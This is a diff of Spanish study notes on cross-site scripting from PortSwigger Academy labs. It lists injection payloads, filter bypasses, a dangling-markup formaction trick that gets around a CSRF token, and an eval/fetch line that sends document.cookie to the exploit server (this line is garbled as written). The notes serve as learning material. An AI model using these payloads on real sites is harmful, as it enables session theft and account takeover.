@@ -3,8 +3,8 @@ LABS
 1. `{{$on.constructor('alert(1)')()}}` -> usaba angular js 1.7.7 dependencia vulnerable, además nuestro input iba dentro de ng-app haciendo posible que se renderice cosas como {{1+1}} 
 2. Dentro de `href` se puede ejecutar java script con `javascript:alert(1)`
 3. si estamos dentro de la declaración de una variable habra que usar `-alert()-` para que sea una sintaxis válida
-4. Si dentro de una variable no podemos escapar y ejecutar xss tambien podríamos hacer : `</script><script>alert(1)</script>`
-5. Si no podemos inyectar ningun caracter raro para poner un alert pero nuestro input se pasa a una funcion podríamos poner el valor del caracter que nos bannea pero encodeado en html para que ciando sea pasado a la funcion lo utilice como el caracter que queremos, ejemplo:
+4. Si dentro de una variable no podemos escapar y ejecutar xss también podríamos hacer : `</script><script>alert(1)</script>`
+5. Si no podemos inyectar ningun carácter raro para poner un alert pero nuestro input se pasa a una funcion podríamos poner el valor del carácter que nos bannea pero encodeado en html para que cuando sea pasado a la función lo utilice como el carácter que queremos, ejemplo:
 &apos; -> '
 
 esto funciona porque estabamos en contexto html en un atributo onclick
@@ -44,7 +44,7 @@ EXPLOIT SERVER
 loaction='http payload';
 <script>
 ```
-12. Si sabemos que el usuario presiona la letra X por ejemplo, podriamos hacer un xss de esta manera : `https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)` esto claro esta si se refleja lo que nosotros ponemos detras de ? en algun sitio
+12. Si sabemos que el usuario presiona la letra X por ejemplo, podríamos hacer un xss de esta manera : `https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)` esto claro está si se refleja lo que nosotros ponemos detrás de ? en algun sitio
 
 ## CSP
 
@@ -53,11 +53,11 @@ CSP is a browser security mechanism that aims to mitigate XSS and some other att
 
 La web hace un POST para cambiar el email,
 
-si el body de email se lo ponemos en la url nos deja inyectar html pero todavia nos queda en el body el csrf token
+si el body de email se lo ponemos en la url nos deja inyectar html pero todavía nos queda en el body el csrf token
 
 `https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</button>`
 
-el token no se pone en la url peusto que es post asi que con el html inyectado pondremos que ka peticion sea get para saltarnos el token csrf
+el token no se pone en la url puesto que es post así que con el html inyectado pondremos que la petición sea get para saltarnos el token csrf
 
 `https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" formmethod="get">Click me</button>`
 
@@ -103,18 +103,18 @@ form.submit();
 
 
 ## Comprobaciones de bloqueos
-ehxc7m48yh
-No bloquea <> -> si no via libre
-esta en una variable y no bloquea - ni ' -> `'-alert()-'`
-Esta en una variable y no bloquea \ ni -  -> `\'-alert(1)//
+
+No bloquea <> -> via libre
+Está en una variable y no bloquea - ni ' -> `'-alert()-'`
+Está en una variable y no bloquea \ ni -  -> `\'-alert(1)//
 El input se pasa a una función -> encodear en html Ej.  `'`-> `&apos;`
 Escapa backticks -> usa template -> `${alert(1)}`
 
 
-Si no puedes bypassear por algun caracter usa la funcion atob asií:
+Si no puedes bypassear por algún carácter usa la función atob así:
 
 
-url?caca=eval(atob(fetch(url exploit/?c='+document.cookie)))
+url?c=eval(atob(fetch(url exploit/?c='+document.cookie)))
 
 ejemplo : 
 
